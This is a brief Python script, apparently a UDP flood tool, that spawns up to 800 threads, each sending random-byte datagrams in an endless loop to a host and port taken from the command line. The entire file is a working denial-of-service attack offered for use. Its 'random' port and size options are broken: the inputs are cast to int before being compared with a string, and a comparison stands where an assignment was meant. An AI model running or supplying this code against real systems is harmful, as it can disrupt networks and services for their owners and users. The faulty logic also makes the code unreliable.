import socket
import random
import threading
import sys

ran = ""

def flood(host, port, size, event, ran):
    event.wait()
    while 1:
        if ran =="true":
            size = random.randint(1,65535)
            port = random.randint(1,65535)
        buf = random._urandom(size)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_UDP, socket.SO_REUSEADDR, 1)
            try:
                s.sendto(buf,(host, port))
            except:
                s.close()
        except:
            s.close()

if len(sys.argv) != 5:
    print("\n  UDP Flood Script Code By 413xPr06605\n\nUsage : %s <host/ip> <port/random> <threads> <size/random> "%(sys.argv[0]))
    sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])
if port =="random":
    ran =="true"
thr = int(sys.argv[3])
if thr > 800:
    thr = 800
size = int(sys.argv[4])
if size =="random":
    ran =="true"
event = threading.Event()
for _ in range(thr):
    threading.Thread(target=flood, args=(host, port, size, event, ran, )).start()
event.set()
while 1:
    try:
        input("Flooding . . . ")
    except KeyboardInterrupt:
        sys.exit()